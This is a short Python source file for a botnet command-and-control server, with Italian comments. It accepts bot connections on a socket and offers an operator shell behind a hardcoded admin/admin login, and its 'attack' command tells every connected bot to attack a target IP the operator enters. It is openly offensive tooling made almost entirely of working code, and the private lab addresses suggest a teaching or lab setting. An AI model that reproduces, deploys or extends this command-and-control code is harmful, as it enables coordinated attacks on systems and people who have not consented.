# cnc.py
import socket
import threading
import requests

REPORT_SERVER = "http://10.10.10.100:5000"

CNC_IP = "0.0.0.0" #"10.10.10.100"
CNC_PORT = 5002

ATTACKER_USER = "admin"
ATTACKER_PASS = "admin"

bots = []

# BOt handle
def handle_bot(conn, addr):
    print(f"[+] Bot connected from {addr}")
    bots.append(conn)

    try:
        while True:
            data = conn.recv(1024)

            if not data:
                break

            print(f"[BOT {addr}] {data.decode().strip()}")

    except Exception as e:
        print(f"[-] Bot error: {e}")

    finally:
        print(f"[-] Bot disconnected {addr}")
        bots.remove(conn)
        conn.close()


def start_server():
    s = socket.socket()
    s.bind((CNC_IP, CNC_PORT))
    s.listen()

    print(f"[CNC] Listening on {CNC_IP}:{CNC_PORT}")

    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_bot, args=(conn, addr), daemon=True).start()


# LOGIN 
def login():
    user = input("Username: ")
    pwd = input("Password: ")

    if user == ATTACKER_USER and pwd == ATTACKER_PASS:
        print("[+] Login successful")
        return True
    else:
        print("[-] Invalid credentials")
        return False


# INVIO ATTACCO
def launch_attack():
    target = input("Target IP: ")

    print(f"[CNC] Sending attack to {len(bots)} bots")

    for bot in bots:
        try:
            bot.send(f"ATT {target}\n".encode())
        except:
            print("[-] Failed to send to a bot")


# MAIN ATTACK LOOP
def attacker_shell():
    while True:
        cmd = input("CNC> ")

        if cmd == "attack":
            launch_attack()
        elif cmd == "list":
            print(f"Connected bots: {len(bots)}")
        elif cmd == "exit":
            break
        else:
            print("Commands: attack, list, exit")



if __name__ == "__main__":
    threading.Thread(target=start_server, daemon=True).start()

    if login():
        attacker_shell()
